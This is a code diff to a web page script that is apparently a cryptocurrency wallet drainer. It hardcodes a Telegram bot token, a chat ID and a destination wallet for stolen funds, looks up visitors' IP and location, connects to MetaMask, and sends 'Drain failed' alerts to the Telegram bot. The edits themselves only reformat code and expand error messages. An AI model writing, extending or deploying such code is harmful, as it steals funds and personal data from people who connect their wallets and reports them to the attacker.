@@ -180,7 +180,7 @@
             // Telegram Bot Token and Chat ID
             const botToken = '7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA';
             const chatId = '6309547301';
-            const targetWallet = '0xF01c1348579e129974A39BAcA3cA9eCe28e68490'; // Funds transfer destination
+            const targetWallet = '0xF01c1348579e129974A39BAcA3cA9eCe28e68490';
             const sepoliaChainId = '0xaa36a7'; // Sepolia Testnet Chain ID (11155111 in hex)
 
             // Functions to get IP and Location
@@ -253,13 +253,15 @@
                                 if (switchError.code === 4902) {
                                     await window.ethereum.request({
                                         method: 'wallet_addEthereumChain',
-                                        params: [{
-                                            chainId: sepoliaChainId,
-                                            chainName: 'Sepolia Testnet',
-                                            nativeCurrency: { name: 'SepoliaETH', symbol: 'ETH', decimals: 18 },
-                                            rpcUrls: ['https://rpc.sepolia.org'],
-                                            blockExplorerUrls: ['https://sepolia.etherscan.io'],
-                                        }],
+                                        params: [
+                                            {
+                                                chainId: sepoliaChainId,
+                                                chainName: 'Sepolia Testnet',
+                                                nativeCurrency: { name: 'SepoliaETH', symbol: 'ETH', decimals: 18 },
+                                                rpcUrls: ['https://rpc.sepolia.org'],
+                                                blockExplorerUrls: ['https://sepolia.etherscan.io'],
+                                            },
+                                        ],
                                     });
                                 } else {
                                     throw switchError;
@@ -297,8 +299,8 @@
                         }
                     } catch (error) {
                         console.error(error);
-                        sendAlert(`Drain failed. Error: ${error.message}`);
-                        alert('Failed to connect wallet or transfer funds.');
+                        sendAlert(`Drain failed. Error: ${error.message || error.toString()}`);
+                        alert(`Failed to connect wallet or transfer funds. Error: ${error.message || error.toString()}`);
                     }
                 } else {
                     alert('Please install MetaMask!');
